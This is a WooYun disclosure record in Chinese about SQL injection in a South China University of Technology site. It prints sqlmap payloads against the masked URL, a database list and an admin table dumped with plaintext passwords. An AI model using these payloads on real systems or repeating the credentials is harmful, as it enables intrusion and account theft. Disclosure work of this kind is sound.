{"id": 80366, "wybug_id": "wooyun-2015-0156059", "wybug_title": "看我是如何发现华南理工大学旗下站点之漏洞(SQL注射+可跨数据库)", "wybug_corp": "华南理工大学", "wybug_author": "路人甲", "wybug_date": "2015-11-26 14:36", "wybug_open_date": "2015-12-01 14:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-01：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  SQL注入 可跨数据库 等漏洞。。。   漏洞证明：  目标站点:http://**.**.**.**/IIS:6.0 + MSSQL注入点:http://**.**.**.**/showwork.aspx?id=1698test:sqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: Microsoft SQL Server/Sybase boolean-based blind - Parameter replace    Payload: id=(SELECT (CASE WHEN (6835=6835) THEN 6835 ELSE 6835*(SELECT 6835FROM master..sysdatabases) END))    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: id=1698 AND 5904=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(113)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5904=5904) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(112)+CHAR(113)))    Type: inline query    Title: Microsoft SQL Server/Sybase inline queries    Payload: id=(SELECT CHAR(113)+CHAR(107)+CHAR(113)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (4941=4941) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(112)+CHAR(113))    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: id=1698;WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: id=1698 WAITFOR DELAY '0:0:5'    Type: UNION query    Title: Generic UNION query (NULL) - 10 columns    Payload: id=-8314 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(107)+CHAR(113)+CHAR(106)+CHAR(113)+CHAR(86)+CHAR(70)+CHAR(101)+CHAR(66)+CHAR(73)+CHAR(65)+CHAR(81)+CHAR(98)+CHAR(117)+CHAR(107)+CHAR(113)+CHAR(98)+CHAR(113)+CHAR(112)+CHAR(113),NULL,NULL-----[13:34:12] [INFO] testing Microsoft SQL Server[13:34:13] [INFO] confirming Microsoft SQL Server[13:34:19] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[13:34:19] [WARNING] HTTP error codes detected during run:500 (Internal Server Error) - 22 times[13:34:19] [INFO] fetched data logged to text files under 'C:\\Users\\Administrator\\.sqlmap\\output\\**.**.**.**'[*] shutting down at 13:34:19available databases [9]:[*] cst_db[*] hrdb[*] kaosheng[*] master[*] model[*] msdb[*] SiteFactory[*] tempdb[*] volunteercurrent user:    'cst_admin'[13:36:41] [INFO] fetching current databasecurrent database:    'cst_db'Database: cst_db[3 tables]+----------+| admin    || proclass || product  |+----------+Database: cst_dbTable: admin[3 columns]+--------+----------+| Column | Type     |+--------+----------+| admin  | nvarchar || id     | int      || pwd    | nvarchar |+--------+----------+Database: cst_dbTable: admin[9 entries]+----+-------+--------+| id | admin | pwd    |+----+-------+--------+| 10 | cst-3 | cst123 || 11 | cst-4 | cst123 || 12 | cst-5 | cst123 || 3  | allan | allan  || 5  | jwgl  | cst123 || 6  | xsgz  | cst123 || 7  | djgz  | cst123 || 8  | cst-1 | cst123 || 9  | cst-2 | cst123 |+----+-------+--------+\n\n\n\n\n\n存在注入 不深入测试。。。   修复方案：  你们比我了解，，，   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-12-01 14:38 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}